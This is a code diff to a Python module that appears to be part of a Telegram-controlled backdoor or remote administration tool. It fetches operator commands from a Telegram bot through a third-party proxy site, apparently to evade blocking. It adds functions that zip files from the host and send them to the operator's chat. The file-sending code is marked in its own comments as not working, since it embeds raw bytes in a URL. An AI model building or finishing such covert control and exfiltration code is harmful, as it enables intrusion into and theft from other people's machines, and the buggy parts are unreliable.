@@ -8,8 +8,9 @@ import requests
 import json
 import platform
 import time
+import zipfile
 
-from os import getcwd, getpid
+from os import getcwd, getpid, path
 from socket import gethostname, gethostbyname
 from uuid import getnode as get_system_mac_addres
 from bs4 import BeautifulSoup
@@ -119,7 +120,7 @@ def post_data(url, logger) -> bool:
         return False
 
 
-def post_data_by_third_party_proxy(url, logger):
+def post_data_by_third_party_proxy(url, logger, time_out=5):
     '''
     return False or response \n
     Send information using the http debugger site \n
@@ -136,7 +137,7 @@ def post_data_by_third_party_proxy(url, logger):
         response = requests.post(
             url="https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",
             data=payload,
-            timeout=5)
+            timeout=time_out)
 
         if response.status_code == 200:
             logger.info(
@@ -155,6 +156,20 @@ def post_data_by_third_party_proxy(url, logger):
         return False
 
 
+def clean_response_third_party_proxy(response, logger):
+    '''get http response from third party proxy (http debuger .com) and get telegram data'''
+    try:
+        response_source = response.text
+        response_source = BeautifulSoup(response_source, "html.parser")
+        response_source = response_source.find("div", id="ResultData").text
+        return response_source.strip()
+
+    except Exception as error:
+        logger.info(
+            f'clean_response_third_party_proxy: {error}')
+        return False
+
+
 def get_update_by_third_party_proxy(TELEGRAM_TOKEN, logger):
     '''Get the latest command sent to the bot in the last 24 hours by third party proxy'''
 
@@ -169,14 +184,19 @@ def get_update_by_third_party_proxy(TELEGRAM_TOKEN, logger):
         return False
 
     try:
-
-        response_source = response.text
-        response_source = BeautifulSoup(response_source, "html.parser")
-        response_source = response_source.find("div", id="ResultData").text
+        response_source = clean_response_third_party_proxy(
+            response, logger=logger)
+        if not response_source:
+            return False
 
         if 'The remote server returned an error' in response_source:
             logger.error(
-                f'get_update_by_third_party_proxy [False TOKEN or ADMIN_CHAT_ID] error: {response_source}')
+                f'get_update_by_third_party_proxy: [False TOKEN or ADMIN_CHAT_ID] error: {response_source}')
+            return False
+
+        if 'The remote server returned an error: (400) Bad Request.' in response_source:
+            logger.error(
+                f'get_update_by_third_party_proxy: telegram api server error: {response_source}')
             return False
 
         response_source = response_source.replace("Response Content", "")
@@ -250,3 +270,87 @@ def extract_last_admin_command(messages: list, ADMIN_CHAT_ID: str, TELEGRAM_TOKE
     set_message_ofset(messages, TELEGRAM_TOKEN, ADMIN_CHAT_ID, logger)
 
     return message_text
+
+
+def make_zip_file(route, logger):
+    '''get file route, make zip file and save to courent route \n
+    return True, new_file_name |or| return False, 'None' \n
+    sample: istrue, file_name = make_zip(./test.txt)
+
+    To send a file in Telegram, this file must be zipped
+    '''
+
+    # input: /home/onion/text.py ooutput: text.zip
+    new_file_name = path.splitext(path.basename(route))[0]
+    new_file_name = f'{new_file_name}.zip'
+
+    if not path.isfile(route):
+        logger.error('make_zip_file: is not a file')
+        return False, 'None'
+
+    try:
+        with zipfile.ZipFile(new_file_name, "w", compression=zipfile.ZIP_DEFLATED) as zf:
+            zf.write(route, path.basename(route))
+        logger.info(
+            f'make_zip_file: The file was successfully zipped, file name {new_file_name}')
+        return True, new_file_name
+
+    except Exception as error:
+        logger.error(f'make_zip_file: {error}')
+        return False, error
+
+
+def _make_send_file_api_url(TELEGRAM_TOKEN, ADMIN_CHAT_ID, zip_file_name, logger) -> str:
+
+    # TODO: telegram error: The remote server returned an error: (400) Bad Request.  please debug this!
+    ''' > have bug
+
+    make and return api link for send file to admin
+    To send a file in Telegram, this file must be zipped and its size must be less than 50 MB
+    '''
+
+    # opne zip file as binary
+    try:
+        with open(zip_file_name, 'rb') as bin_ary:
+            binary_zip_file = bin_ary.read()
+
+        return f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument?chat_id={ADMIN_CHAT_ID}&document={binary_zip_file}'
+
+    except Exception as error:
+        logger.error(
+            f'make_send_file_api_url: read binary file error: {error}')
+        return False
+
+
+def _send_file_by_third_party_proxy(TELEGRAM_TOKEN, ADMIN_CHAT_ID, file_route, logger, time_out=300) -> bool:
+    ''' > its not work, make_send_file_api_url() have some bug'''
+
+    is_zip_true, zip_file_name = make_zip_file(file_route, logger)
+
+    if is_zip_true:
+        api = _make_send_file_api_url(
+            TELEGRAM_TOKEN, ADMIN_CHAT_ID, zip_file_name, logger)
+
+        if api:
+            response = post_data_by_third_party_proxy(
+                api, logger, time_out=time_out)
+            response = clean_response_third_party_proxy(response, logger)
+
+            if not response:
+                return False
+
+            elif 'The remote server returned an error: (400) Bad Request.' in response:
+                logger.error(
+                    f'get_update_by_third_party_proxy: telegram api server error: {response}')
+                return False
+
+            elif 'The remote server returned an error' in response:
+                logger.error(
+                    f'get_update_by_third_party_proxy: [False TOKEN or ADMIN_CHAT_ID] error: {response}')
+                return False
+
+            else:
+                logger.info(f'_____its some else: {response}')
+
+    logger.error('send_file_by_third_party_proxy: file not sended!')
+    return False
